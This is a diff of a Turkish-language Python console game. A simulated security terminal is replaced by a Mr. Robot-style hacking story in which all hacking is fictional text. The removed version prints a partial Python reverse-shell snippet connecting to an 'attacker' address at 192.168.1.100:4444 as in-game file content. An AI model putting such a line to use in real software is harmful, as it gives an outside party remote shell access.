@@ -1,76 +1,111 @@
 import os
 import time
+import sys
 
-# --- SİSTEM DOSYALARI (Sanal Klasörler) ---
-sanal_sistem = {
-    "root": {
-        "kullanicilar": {
-            "mustafa": ["odev.txt", "oyunlar.lnk"],
-            "misafir": ["notlar.txt"]
-        },
-        "sistem32": {
-            "driverlar": ["ekran_karti.sys", "internet.sys"],
-            "ayarlar": ["config.inf", "güvenlik_duvari.exe"]
-        },
-        "gecici_dosyalar": ["temp1.log", "update.exe", "backdoor.py"] # HMMM?
-    }
-}
+# Renk Ayarları
+G = '\033[92m' # Yeşil
+R = '\033[91m' # Kırmızı
+Y = '\033[93m' # Sarı
+C = '\033[96m' # Turkuaz
+B = '\033[94m' # Mavi
+RESET = '\033[0m'
 
-def terminal_ekrani():
-    print("\n" + "="*40)
-    print("DÜKKAN GÜVENLİK TERMİNALİ v3.0")
-    print("Komutlar: 'ls' (listele), 'cd [isim]' (gir), 'cat [dosya]' (oku), 'exit'")
-    print("="*40)
+def typing(text, speed=0.04):
+    for char in text:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(speed)
+    print()
 
-    su_an = "root"
-    yol = ["root"]
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
+def start_game():
+    clear()
+    typing(R + ">>> INTRUSION DETECTED IN E-CORP CORE..." + RESET, 0.06)
+    typing(G + ">>> BYPASSING FIREWALL... [DONE]", 0.03)
+    typing(G + ">>> CONNECTED TO NODE: 192.168.1.1", 0.03)
+    time.sleep(1)
+    
+    fbi_level = 0
+    has_key = False
+    
     while True:
-        komut = input(f"C:/{'/'.join(yol)}> ").strip().lower()
+        print(f"\n{B}[Hacker: Elliot] [Tehlike: %{fbi_level}]{RESET}")
+        cmd_input = input(f"{G}root@e-corp:~# {RESET}").strip().lower().split()
         
-        if komut == "exit":
+        if not cmd_input: continue
+        cmd = cmd_input[0]
+
+        # --- YARDIM MENÜSÜ ---
+        if cmd == "help":
+            print(f"{C}ls{RESET} - Dosyaları gör")
+            print(f"{C}cat [dosya]{RESET} - İçeriği oku")
+            print(f"{C}hack [hedef]{RESET} - Sisteme sız (FBI riskli!)")
+            print(f"{C}whoami{RESET} - Kimliğini sorgula")
+            print(f"{C}shred [dosya]{RESET} - Dosyayı yok et")
+            print(f"{C}status{RESET} - FBI takip durumunu gör")
+
+        # --- DOSYA SİSTEMİ ---
+        elif cmd == "ls":
+            print("borc_listesi.db  wellick_mail.txt  kamera_sistem.sh  gizli_anahtar.enc")
+
+        elif cmd == "whoami":
+            typing(Y + "...Ben kimim? Bazen Mr. Robot konuşuyor, bazen ben. Ama bugün devrim konuşacak." + RESET)
+
+        elif cmd == "cat":
+            if "wellick_mail.txt" in cmd_input:
+                typing("Mail from Tyrell: 'Elliot, birlikte dünyayı değiştirebiliriz. Cevabını bekliyorum.'")
+            elif "gizli_anahtar.enc" in cmd_input:
+                typing(R + "[!] DOSYA ŞİFRELİ! Açmak için 'hack' komutunu kullanmalısın." + RESET)
+            elif "borc_listesi.db" in cmd_input:
+                typing("İçerik: 14.5 Trilyon Dolar borç kaydı. Tüm dünya bu dosyaya hapsolmuş.")
+            else:
+                print("Erişim engellendi.")
+
+        # --- AKSİYONLAR ---
+        elif cmd == "hack":
+            if "gizli_anahtar.enc" in cmd_input:
+                typing(Y + "Şifre kırılıyor... Lütfen bekleyin..." + RESET)
+                time.sleep(3)
+                typing(G + ">> ŞİFRE: 'fsociety2026' BULUNDU!" + RESET)
+                has_key = True
+                fbi_level += 15
+            elif "kamera_sistem.sh" in cmd_input:
+                typing(B + ">> E-Corp güvenlik kameraları bypass edildi. Şu an koridorları görüyorsun." + RESET)
+                fbi_level += 20
+            else:
+                print("Hedef belirtilmedi.")
+
+        elif cmd == "shred":
+            if "borc_listesi.db" in cmd_input:
+                if has_key:
+                    typing(R + ">> 5/9 OPERASYONU BAŞLADI..." + RESET)
+                    time.sleep(2)
+                    typing(G + "[SON: DÜNYA DEĞİŞTİ] Tüm borçlar silindi. E-Corp iflas etti. Kazandın Elliot." + RESET)
+                    break
+                else:
+                    typing(Y + "Hata: Önce 'gizli_anahtar.enc' dosyasını hackleyip anahtarı almalısın!" + RESET)
+            else:
+                print("Silinecek kritik dosya bulunamadı.")
+
+        elif cmd == "status":
+            typing(f"İzlenme oranı: %{fbi_level}")
+            if fbi_level > 50: typing(R + "DİKKAT: FBI konumunu tespit etmek üzere!" + RESET)
+
+        elif cmd == "exit":
+            typing("Sistemden çıkılıyor... Güle güle Elliot.")
             break
-            
-        elif komut == "ls":
-            # Bulunduğun yerdeki dosyaları/klasörleri göster
-            hedef = sanal_sistem
-            for adim in yol:
-                hedef = hedef[adim]
-            
-            if isinstance(hedef, dict):
-                print("Klasörler/Dosyalar:", ", ".join(hedef.keys()))
-            else:
-                print("Dosya İçeriği:", hedef)
 
-        elif komut.startswith("cd "):
-            yeni_yer = komut.split(" ")[1]
-            hedef = sanal_sistem
-            for adim in yol:
-                hedef = hedef[adim]
-            
-            if yeni_yer in hedef:
-                yol.append(yeni_yer)
-            elif yeni_yer == "..":
-                if len(yol) > 1: yol.pop()
-            else:
-                print("Hata: Böyle bir klasör bulunamadı.")
-
-        elif komut.startswith("cat "):
-            dosya_adi = komut.split(" ")[1]
-            # Burada 'backdoor.py' dosyasını okursan saldırganın kodunu göreceksin!
-            if dosya_adi == "backdoor.py":
-                print("\n[TEHLİKE] Dosya İçeriği Okunuyor...")
-                time.sleep(1)
-                print(">>> import socket, subprocess")
-                print(">>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
-                print(">>> s.connect(('192.168.1.100', 4444)) # SALDIRGANIN ADRESİ!")
-                print(">>> # BU BİR REVERSE SHELL VİRÜSÜDÜR!")
-            elif dosya_adi == "odev.txt":
-                print("İçerik: Matematik ödevini bitir, LGS'ye çalış.")
-            else:
-                print("İçerik: Standart sistem dosyası.")
         else:
-            print("Geçersiz komut.")
+            print("Bilinmeyen komut. Hata yapman FBI'ın işini kolaylaştırıyor.")
+            fbi_level += 5
 
-terminal_ekrani()
+        # --- KAYBETME DURUMU ---
+        if fbi_level >= 100:
+            typing(R + "\n[!!!] KONUMUN BULUNDU! Kapı kırılıyor... FBI İÇERİ GİRDİ!" + RESET)
+            typing("Hapis hayatına hazır ol Elliot.")
+            break
 
+if __name__ == "__main__":
+    start_game()
